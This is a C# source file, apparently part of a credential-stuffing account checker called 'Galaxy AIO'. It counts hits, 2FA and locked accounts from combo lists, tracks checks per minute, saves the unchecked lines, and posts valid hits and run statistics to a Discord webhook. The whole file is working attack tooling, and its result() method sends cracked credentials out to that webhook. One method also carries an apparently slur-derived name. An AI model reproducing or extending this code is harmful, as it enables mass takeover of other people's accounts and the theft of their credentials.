using System; using Galaxy.Mainm;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using JNogueira.Discord.Webhook.Client;
using ZuttPal;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Net;
using AuthGG;

namespace Galaxy.Mainm
{
    class stats
    {
        public static string url;
        public static bool lines_in_use;
        public static void remove(string Combo)
        {
            if (lines_in_use == true)
            {
                cloneCombo.Remove(Combo);
            }
        }
        public static List<string> cloneCombo = new List<string>();
        public static void remaining()
        {
            Task.Factory.StartNew(delegate
            {
                while (true)
                {
                    if (Console.KeyAvailable)
                    {
                        Task.Factory.StartNew(delegate
                        {
                            var key = Console.ReadKey(true);
                            if (key.Key == ConsoleKey.S)
                            {
                                lines_in_use = false;
                                File.AppendAllLines($"Remaining.txt", cloneCombo);
                                Process.Start(new ProcessStartInfo("cmd.exe", "/c " + "START CMD /k \"TITLE ZuttPal && ECHO Saved Remaining Lines...\"") { CreateNoWindow = false, UseShellExecute = false, RedirectStandardOutput = true });
                                Process.GetCurrentProcess().Kill();
                            }
                        });
                    }
                }
            });
        }
        public static async void send()
        {
            int remaining = filecount - checcc;
            var client = new DiscordWebhookClient(url);
            var message = new JNogueira.Discord.Webhook.Client.DiscordMessage(
                " ",
                username: "Galaxy AIO",
                avatarUrl: "https://cdn.discordapp.com/attachments/845772208353837066/847518671919775794/4k-resolution-desktop-wallpaper-space-ultra-high-definition-television-milky-way-1.png",
                tts: false,
                embeds: new[]
                {
                    new DiscordMessageEmbed(
                        Checking.currentrun,
                        color: 0,
                        author: new DiscordMessageEmbedAuthor("Status"),

                        fields: new[]
                        {
                            new DiscordMessageEmbedField("Hits", $"{hits}"),
                            new DiscordMessageEmbedField("2FA", $"{twofa}"),
                            new DiscordMessageEmbedField("Custom/Locked/Expired", $"{custom}"),
                            new DiscordMessageEmbedField("Bad", $"{bad}"),
                            new DiscordMessageEmbedField("CPM", $"{GetCurrentCPM()}"),
                            new DiscordMessageEmbedField("Checked", $"{checcc}"),
                            new DiscordMessageEmbedField("Total Combo", $"{filecount}"),
                            new DiscordMessageEmbedField("Remaining", $"{remaining}")

                        }
                    )
                }
            );
            await client.SendToDiscord(message);
        }

        public static async void cfg()
        {
            int remaining = filecount - checcc;
            var client = new DiscordWebhookClient(url);
            var message = new JNogueira.Discord.Webhook.Client.DiscordMessage(
                " ",
                username: "Galaxy AIO",
                avatarUrl: "https://cdn.discordapp.com/attachments/845772208353837066/847518671919775794/4k-resolution-desktop-wallpaper-space-ultra-high-definition-television-milky-way-1.png",
                tts: false,
                embeds: new[]
                {
                    new DiscordMessageEmbed(
                        Checking.currentrun,
                        color: 0,
                        author: new DiscordMessageEmbedAuthor("Current Config"),

                        fields: new[]
                        {
                            new DiscordMessageEmbedField("Threads", $"{Program.config.threads}")

                        }
                    )
                }
            );
            await client.SendToDiscord(message);
        }
        public static void sendDiscordWebhook(string URL, string escapedjson)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(escapedjson);
            wr.GetResponse();
        }

        public static async void lol()
        {
            int remaining = filecount - checcc;
            var client = new DiscordWebhookClient(url);
            var message = new JNogueira.Discord.Webhook.Client.DiscordMessage(
                " ",
                username: "Galaxy AIO",
                avatarUrl: "https://cdn.discordapp.com/attachments/845772208353837066/847518671919775794/4k-resolution-desktop-wallpaper-space-ultra-high-definition-television-milky-way-1.png",
                tts: false,
                embeds: new[]
                {
                    new DiscordMessageEmbed(
                        Checking.currentrun,
                        color: 0,
                        author: new DiscordMessageEmbedAuthor("Status"),

                        fields: new[]
                        {
                            new DiscordMessageEmbedField("Hits", $"{hits}"),
                            new DiscordMessageEmbedField("2FA", $"{twofa}"),
                            new DiscordMessageEmbedField("Custom/Locked/Expired", $"{custom}"),
                            new DiscordMessageEmbedField("Bad", $"{bad}"),
                            new DiscordMessageEmbedField("CPM", $"{GetCurrentCPM()}"),
                            new DiscordMessageEmbedField("Checked", $"{checcc}"),
                            new DiscordMessageEmbedField("Total Combo", $"{filecount}"),
                            new DiscordMessageEmbedField("Remaining", $"{remaining}")

                        }
                    )
                }
            );
            await client.SendToDiscord(message);
        }

        public static async void result(string text)
        {
            var client = new DiscordWebhookClient(url);
            var message = new JNogueira.Discord.Webhook.Client.DiscordMessage(
                " ",
                username: "Galaxy AIO",
                avatarUrl: "https://cdn.discordapp.com/attachments/845772208353837066/847518671919775794/4k-resolution-desktop-wallpaper-space-ultra-high-definition-television-milky-way-1.png",
                tts: false,
                embeds: new[]
                {
                    new DiscordMessageEmbed(
                        Checking.currentrun,
                        color: 0,
                        author: new DiscordMessageEmbedAuthor("Valid"),

                        fields: new[]
                        {
                            new DiscordMessageEmbedField($"Hit", $"{text}"),

                        }
                    )
                }
            );
            await client.SendToDiscord(message);

        }
        public static int filecount;
        public static int checcc;
        public static int hits;
        public static int bad;
        public static int twofa;
        public static int custom;

        public static int GetCurrentCPM()
        {
            DateTime dateTime = stats.currentCpmDatetime;
            if ((DateTime.Now - stats.currentCpmDatetime).Minutes >= 1)
            {
                stats.lastCpms.Add(YahooInbox1check.currentCpm);
                stats.currentCpm = 0;
                stats.currentCpmDatetime = DateTime.Now;
            }
            int num = stats.currentCpm;
            for (int i = 0; i < stats.lastCpms.Count; i++)
            {
                num += stats.lastCpms[i];
            }
            int result;
            if (stats.lastCpms.Count == 0)
            {
                result = num;
            }
            else
            {
                result = num / stats.lastCpms.Count;
            }
            return result;
        }
        // how to search in all files. search for a word like you did before
        public static int currentCpm;

        // Token: 0x0400000A RID: 10
        public static DateTime currentCpmDatetime;

        // Token: 0x0400000B RID: 11
        public static List<int> lastCpms = new List<int>();
        public static void save()
        {
            Task.Factory.StartNew(delegate
            {
                while (true)
                {
                    if (Console.KeyAvailable)
                    {
                        Task.Factory.StartNew(delegate
                        {
                            var key = Console.ReadKey(true);
                            if (key.Key == ConsoleKey.Tab)
                            {
                                if (Program.config.usewebhook == "True")
                                {
                                    send();
                                }
                                else
                                {
                                    Console.WriteLine("No Webhook In Use");
                                }
                            }
                        });
                    }
                }
            });
        }
        public static void nig()
        {
            Task.Factory.StartNew(delegate
            {
                while (true)
                {
                    if (Console.KeyAvailable)
                    {
                        Task.Factory.StartNew(delegate
                        {
                            var key = Console.ReadKey(true);
                            if (key.Key == ConsoleKey.Home)
                            {
                                if (Program.config.usewebhook == "True")
                                {
                                    cfg();
                                }
                                else
                                {
                                    Console.WriteLine("No Webhook In Use");
                                }
                            }
                        });
                    }
                }
            });
        }
    }
}
